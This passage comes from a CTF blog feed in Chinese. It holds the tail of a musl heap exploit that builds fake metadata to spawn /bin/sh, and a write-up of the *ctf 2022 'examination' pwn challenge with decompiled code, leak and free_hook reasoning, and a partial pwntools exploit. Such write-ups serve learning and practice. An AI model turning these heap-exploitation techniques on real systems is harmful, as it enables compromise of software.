class=\"line\">meta_base  = active[<span class=\"number\">0</span>]-<span class=\"number\">0x28</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;Z&#x27;</span>*<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;Z&#x27;</span>*<span class=\"number\">0x100</span>)\t\t\t\t<span class=\"comment\">#fill up  the old meta to create new meta3(0x2c)</span></span><br><span class=\"line\"></span><br><span class=\"line\">clean()</span><br><span class=\"line\"></span><br><span class=\"line\">fakemeta_addr = <span class=\"number\">0x291020</span>+libcbase</span><br><span class=\"line\">fake_meta =<span class=\"string\">b&#x27;\\x00&#x27;</span>*(<span class=\"number\">4064</span>)+p64(secret)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span> \t\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">fake_meta += p64(ofl_head-<span class=\"number\">0x8</span>)+p64(fake_stdout_addr)\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">#fakemta1</span></span><br><span class=\"line\">fake_meta +=p64(fakemeta_addr+<span class=\"number\">0x40</span>)+p64(<span class=\"number\">0x3fe</span>)+p64(<span class=\"number\">0xa9</span>)+p64(<span class=\"number\">0</span>)\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">fake_meta +=p64(fakemeta_addr+<span class=\"number\">0x1000</span>)+p64(<span class=\"number\">0x0000c00000000000</span>)</span><br><span class=\"line\">fake_meta +=p64(fakemeta_addr)+p64(<span class=\"number\">0x0000800000000009</span>)</span><br><span class=\"line\">fake_meta +=<span class=\"string\">b&quot;AAAAAAAA&quot;</span></span><br><span class=\"line\">fake_meta = fake_meta.ljust((<span class=\"number\">0x2000</span>-<span class=\"number\">0x20</span>),<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">fake_meta +=p64(secret)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>   \t\t\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">#fake_area1</span></span><br><span class=\"line\">fake_meta += p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(fakemeta_addr+<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0x0</span>)+p64(<span class=\"number\">0x3c0</span>)+p64(<span class=\"number\">0</span>)\t\t\t<span class=\"comment\">#fakemeta2\t</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#prepare fake chunk and fake sotor</span></span><br><span class=\"line\">add(<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;h&#x27;</span>*<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;h&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fakebabynote = p64( <span class=\"number\">0x29fdd0</span> +libcbase)+p64(fakemeta_addr+<span class=\"number\">0x50</span>)+p64(<span class=\"number\">1</span>)+p64(<span class=\"number\">0x28</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;i&#x27;</span>,fakebabynote)</span><br><span class=\"line\">free(<span class=\"string\">b&#x27;g&#x27;</span>*<span class=\"number\">0x28</span>)</span><br><span class=\"line\">gdb.attach(r)</span><br><span class=\"line\">add(p64(<span class=\"number\">0x29bd00</span>+libcbase)*<span class=\"number\">2</span>+p64(<span class=\"number\">0x8</span>)+p64(<span class=\"number\">0x8</span>)+p64(libcbase+<span class=\"number\">0x29bd90</span>),fake_meta.ljust(<span class=\"number\">0x2000</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">free(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\">fake_stdfile  =<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"number\">0</span>)*<span class=\"number\">6</span>+p64(<span class=\"number\">1</span>)*<span class=\"number\">2</span>+p64(system)*<span class=\"number\">2</span></span><br><span class=\"line\">fake_stdfile = fake_stdfile.ljust(<span class=\"number\">0x50</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&#x27;i&#x27;</span>,fake_stdfile)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">ch(<span class=\"number\">5</span>)</span><br><span class=\"line\">pause()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考链接\"><a class=\"markdownIt-Anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQxMTAx\">https://www.anquanke.com/post/id/241101</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2thbGlfTWEvYXJ0aWNsZS9kZXRhaWxzLzEyMjk3MDg4NT9vcHNfcmVxdWVzdF9taXNjPSUyNTdCJTI1MjJyZXF1ZXN0JTI1NUZpZCUyNTIyJTI1M0ElMjUyMjE2NTA0NDQwOTMxNjc4MDI2NTQ3NDgzNiUyNTIyJTI1MkMlMjUyMnNjbSUyNTIyJTI1M0ElMjUyMjIwMTQwNzEzLjEzMDEwMjMzNC5wYyUyNTVGYWxsLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTY1MDQ0NDA5MzE2NzgwMjY1NDc0ODM2JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMg==\">https://blog.csdn.net/kali_Ma/article/details/122970885?ops_request_misc=%7B%22request%5Fid%22%3A%22165044409316780265474836%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=165044409316780265474836&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</span><sub>all</sub>first_rank_ecpm_v1~rank_v31_ecpm-1-122970885.142<sup>v9</sup>control,157<sup>v4</sup>control&amp;utm_term=musl+%E5%A0%86%E5%88%A9%E7%94%A8&amp;spm=1018.2226.3001.4187</p>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/18/starctf_examination/",
            "url": "http://example.com/2022/04/18/starctf_examination/",
            "title": "examination",
            "date_published": "2022-04-18T07:17:17.000Z",
            "content_html": "<h1 id=\"from-2022418-ctf-pwn-examination\"><a class=\"markdownIt-Anchor\" href=\"#from-2022418-ctf-pwn-examination\">#</a> from 2022.4.18 *ctf pwn examination</h1>\n<h2 id=\"保护\"><a class=\"markdownIt-Anchor\" href=\"#保护\">#</a> 保护：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop<span class=\"comment\">/*ctf/examin$ checksec --file=examination</span></span><br><span class=\"line\"><span class=\"comment\">RELRO           STACK CANARY      NX            PIE             </span></span><br><span class=\"line\"><span class=\"comment\">Full RELRO      Canary found      NX enabled    PIE enabled    </span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable\tFILE</span></span><br><span class=\"line\"><span class=\"comment\">No RPATH   RW-RUNPATH   No Symbols\t  No\t0\t\t2\t\texamination</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br></pre></td></tr></table></figure>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>程序，进行了不同的模式，teacher 或者 student，</p>\n<h3 id=\"重要的结构体\"><a class=\"markdownIt-Anchor\" href=\"#重要的结构体\">#</a> 重要的结构体</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000</span> student         struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x20</span>, mappedto_8)\t\t\t\t\t/chunksize=<span class=\"number\">0x31</span></span><br><span class=\"line\"><span class=\"number\">00000000</span> stu             dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000008</span> nop             dq ?</span><br><span class=\"line\"><span class=\"number\">00000010</span> mode            dq ?                    ; offset\t\t\t\t\t/mode chunkszie =<span class=\"number\">0x31</span></span><br><span class=\"line\"><span class=\"number\">00000018</span> Type            dd ?</span><br><span class=\"line\"><span class=\"number\">0000001</span>C win             dd ?</span><br><span class=\"line\"><span class=\"number\">00000020</span> student         ends</span><br><span class=\"line\"><span class=\"number\">00000020</span></span><br><span class=\"line\"><span class=\"number\">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class=\"line\"><span class=\"number\">00000000</span></span><br><span class=\"line\"><span class=\"number\">00000000</span> info            struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x14</span>, mappedto_9)\t\t\t\t\t/chunksize=<span class=\"number\">0x31</span></span><br><span class=\"line\"><span class=\"number\">00000000</span> nums_qestion    dd ?</span><br><span class=\"line\"><span class=\"number\">00000004</span> score           dd ?</span><br><span class=\"line\"><span class=\"number\">00000008</span> comment         dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000010</span> size            dd ?</span><br><span class=\"line\"><span class=\"number\">00000014</span> info            ends</span><br><span class=\"line\"><span class=\"number\">00000014</span></span><br></pre></td></tr></table></figure>\n<p>按照惯例，我们首先要看的就是对于堆块的输入是否存在着溢出，</p>\n<p>在 teacher 模式下，可以写 commend，但是因为要求你写入 size，并根据 size 大小 calloc，这里目前是不存在溢出的</p>\n<p>另外一个是在 student 模式下 set mode，这里 calloc 0x20 大小的 chunk，然后读入 0X20 数据，也不存在溢出。</p>\n<p>但是我们审计这里发现，判断程序是进行读入 mode 还是预测 pray score，是根据 student 结构体中的 type 判断，而 type 又可以利用 pray 进行操作，type^=1。同时 pray sore 保存的地址与 mode 保存地址一致。所以这里存在任意地址写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">set_mode</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  student *v1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+14h] [rbp-1Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nlist[a1]-&gt;Type != <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !nlist[a1]-&gt;mode )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v1 = nlist[a1];</span><br><span class=\"line\">      v1-&gt;mode = <span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;enter your mode!&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, nlist[a1]-&gt;mode, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_9;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;enter your pray score: 0 to 100&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v3);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 &gt;= <span class=\"number\">0</span> &amp;&amp; v3 &lt;= <span class=\"number\">100</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LOBYTE(nlist[a1]-&gt;mode) = v3;</span><br><span class=\"line\">LABEL_9:</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;finish&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;bad!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">pray</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;prayer...Good luck to you&quot;</span>);</span><br><span class=\"line\">  nlist[a1]-&gt;Type ^= <span class=\"number\">1u</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;finish&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当我们继续继续审计代码，发现 student 的 check rewiew 存在任意地址加一。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title function_\">checkfor_rewiew</span><span class=\"params\">(<span class=\"type\">int</span> a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _BYTE *v1; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">char</span> address[<span class=\"number\">24</span>]; <span class=\"comment\">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+38h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( nlist[a1]-&gt;win == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;already gained the reward!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( nlist[a1]-&gt;stu-&gt;score &gt; <span class=\"number\">0x59</span>u )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Good Job! Here is your reward! %p\\n&quot;</span>, nlist[a1]);</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;add 1 to wherever you want! addr: &quot;</span>);<span class=\"comment\">// 任意地址加1</span></span><br><span class=\"line\">      read_addr(<span class=\"number\">0</span>, address, <span class=\"number\">16</span>);</span><br><span class=\"line\">      v1 = (_BYTE *)atol(address);</span><br><span class=\"line\">      ++*v1;</span><br><span class=\"line\">      nlist[a1]-&gt;win = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( nlist[a1]-&gt;stu-&gt;comment )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;here is the review:&quot;</span>);</span><br><span class=\"line\">      write(<span class=\"number\">1</span>, nlist[a1]-&gt;stu-&gt;comment, nlist[a1]-&gt;stu-&gt;size);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;no reviewing yet!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看到这里时，我有想到将 student comment 的 size 进行加一，或者将 student win 加（但是没啥用好像）。</p>\n<p>再来，我们还需要关注 free，程序只给了我们三次机会，而且只是将 list 中保留的 student 结构体指针清空，而没有清空其他的数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">&quot;which student id to choose?&quot;</span>);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, buf, <span class=\"number\">5uLL</span>);</span><br><span class=\"line\">      idx = atoi(buf);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0</span> &amp;&amp; idx &lt;= <span class=\"number\">9</span> &amp;&amp; nlist[idx] )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bad luck for student %d! Say goodbye to him/her!&quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)idx);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( nlist[idx]-&gt;stu-&gt;message )</span><br><span class=\"line\">          <span class=\"built_in\">free</span>(nlist[idx]-&gt;stu-&gt;message);</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(nlist[idx]-&gt;stu);</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(nlist[idx]);</span><br><span class=\"line\">        nlist[idx] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">        --count;</span><br><span class=\"line\">      &#125;</span><br></pre></td></tr></table></figure>\n<p>接下来思考程序对于堆块数据的输出。只有在 student 模式的 check review 可以输出 comment。</p>\n<h2 id=\"着手漏洞\"><a class=\"markdownIt-Anchor\" href=\"#着手漏洞\">#</a> 着手漏洞</h2>\n<h3 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h3>\n<p>check review 有机会直接输出 student 的地址，但是分数需要够 96, 但是正常情况下是不可以的，因为 question 只能是 0~6，但是我们发现，如果学生进行过 pre，再次打分，就会被扣 10 分，而且数据比较的时候是无符号数，所以只要 question 数为 1，在 pray，被扣 10 分就会成为一个大数。输出 chunk 的地址。这里也解决了一个问题就是，因为我们释放次数有限，而且堆块大小也不可以超过 0x3ff，free 后 chunk 全部进入 tcache，没法泄露 libc，所以我们利用任意地址（一字节的数据类型）加 1，可以将一个 chunk 变得很大，free 后就可以进入 unsortedbin，后面可以申请出来，即使 tcache, 存在，也会优先使用 unsortedbin. 所以我们只要后面 write review 的时候，size&lt;=8, 就可以保留 bk 指针不被修改。但是这里我们可以用更简单的方式，直接将 size 变得更大，（两个方法都要修改保存的 comment size），直接越界输出 main_arena。</p>\n<p>后面就是一个常规的想法，因为 chunk 上有 comment 的指针，所以我们利用上面的溢出，将指针改写为 free_hook，然后再编辑该 review，把 onegadget 写入。最后 free 实际就是调用 execve ().</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>  *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">r= process(<span class=\"string\">&#x27;./examination&#x27;</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&#x27;examination&#x27;</span>)</span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;choice&gt;&gt;&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">changerole</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">5</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;role:&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">givescore</span>():</span><br><span class=\"line\">        ch(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addstudent</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">1</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;questions:&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">writereview</span>(<span class=\"params\">idx,size,text</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">3</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;one&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> size:</span><br><span class=\"line\">                r.sendlineafter(<span class=\"string\">&quot;comment&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(text)==size:</span><br><span class=\"line\">               r.sendafter(<span class=\"string\">&quot;comment&quot;</span>,text)</span><br><span class=\"line\">        <span class=\"keyword\">else</span> :</span><br><span class=\"line\">                 r.sendlineafter(<span class=\"string\">&quot;comment&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">callparent</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">4</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;choose&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pray</span>():</span><br><span class=\"line\">        ch(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setmode</span>(<span class=\"params\">text</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">4</span>)</span><br><span class=\"line\">        r.sendafter(<span class=\"string\">&quot;mode&quot;</span>,text+<span class=\"string\">b&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pray_score</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">        ch(<span class=\"number\">4</span>)</span><br><span class=\"line\">        r.sendlineafter(<span class=\"string\">&quot;score&quot;</span>,<span class=\"built_in\">str</span>(num))</span><br><span 